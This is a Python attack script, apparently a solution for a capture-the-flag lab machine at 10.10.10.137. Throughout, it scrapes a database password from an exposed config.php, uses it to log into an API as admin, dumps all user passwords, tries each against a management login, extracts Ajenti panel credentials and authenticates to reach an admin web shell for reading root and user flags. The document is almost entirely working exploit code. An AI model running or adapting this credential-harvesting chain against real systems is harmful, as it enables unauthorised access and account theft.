#!/usr/bin/python3
import json
import requests

db_pass = requests.request('GET', 'http://10.10.10.137/config.php').content.decode().split("$dbPassword  = '")[1].split("';")[0]
token = requests.request('POST', 'http://10.10.10.137:3000/login', json={"username": "admin", "password": db_pass}).json()['token']
users = requests.request('GET', 'http://10.10.10.137:3000/users', headers={"Authorization": f"Bearer {token}"}).json()
user_pass_map = {}
for user in users:
	user_response = requests.request('GET', f'http://10.10.10.137:3000/users/{user["name"]}', headers={"Authorization": f"Bearer {token}"}).json()
	user_pass_map.update({user_response['name']: user_response['password']})

print(json.dumps(user_pass_map, indent=4))

for user, password in user_pass_map.items():
	print(f'Trying {user}:{password}...')
	login_response = requests.request('GET', 'http://10.10.10.137/management', auth=requests.auth.HTTPBasicAuth(user, password))
	try:
		login_response.raise_for_status()
	except:
		continue
	print(f'!!!Success ({login_response.status_code})!!! - {user}:{password}...')
	# could break here but maybe there could be other valid users
	valid_user = user
	valid_pass = password

print("\n\n")
config_json = requests.request('GET', 'http://10.10.10.137/management/config.json', auth=requests.auth.HTTPBasicAuth(valid_user, valid_pass)).json()
ajenti_users = config_json['users']

for user in ajenti_users:
	ajenti_user = user
	ajenti_password = ajenti_users[user]['password']
	print(f'Ajenti creds: {ajenti_user}:{ajenti_password}')
print(f"Logging into Ajenti at http://10.10.10.137:8000/ for admin web shell with creds: {ajenti_user}:{ajenti_password}")
ajenti_response = requests.request('POST', 'http://10.10.10.137:8000/ajenti:auth', data={'username':ajenti_user, 'password': ajenti_password})
print(ajenti_response.status_code)
print(ajenti_response.url)

# from here just access the web console and read out /root/root.txt and /home/derry/user.txt
